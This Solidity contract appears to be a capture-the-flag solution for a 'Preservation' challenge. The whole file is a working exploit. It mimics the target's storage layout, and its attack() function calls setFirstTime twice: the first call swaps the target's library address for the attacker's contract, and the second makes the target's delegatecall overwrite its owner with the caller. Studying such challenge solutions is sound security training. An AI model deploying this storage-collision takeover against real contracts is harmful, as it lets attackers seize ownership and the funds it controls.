// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IPreservation {
  function setFirstTime(uint256) external;
}

contract PreservationHack {
    // Same storage layout as contract to be attacked 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    IPreservation public challenge;

    constructor(address challengeAddress) {
        challenge = IPreservation(challengeAddress);
    }

    function setTime(uint256 _addr) external {
      // An Ethereum address is a 42-character hexadecimal address
      // 20 bytes (40 characters, 160 bits) excluding the 0x prefix
      // so here we cast it to a uint160 first and recast into an address
        owner = address(uint160(_addr));
    }

    function attack() external {
      // even though uint160 would be enough, the setTime function requires a uint256 input
        challenge.setFirstTime(uint256(uint160(address(this))));
        challenge.setFirstTime(uint256(uint160(msg.sender)));
    }
}
